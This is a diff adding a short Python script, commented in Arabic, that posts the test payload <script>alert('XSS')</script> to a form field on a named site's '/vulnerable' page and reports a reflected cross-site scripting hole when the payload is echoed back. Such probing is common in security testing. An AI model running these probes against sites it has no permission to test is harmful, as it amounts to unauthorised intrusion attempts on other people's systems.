@@ -1,0 +1,22 @@
+import requests
+
+def exploit_xss(url, payload):
+    # تجهيز الطلب
+    data = {
+        'inputField': payload
+    }
+    
+    # إرسال الطلب
+    response = requests.post(url, data=data)
+    
+    # التحقق من استجابة السيرفر
+    if payload in response.text:
+        print(f"XSS vulnerability found with payload: {payload}")
+    else:
+        print("No vulnerability found.")
+
+# مثال على الاستخدام
+if __name__ == "__main__":
+    target_url = "https://www.chatliyily.com/vulnerable"  # استبدل هذا بالرابط الصحيح
+    payload = "<script>alert('XSS')</script>"
+    exploit_xss(target_url, payload)
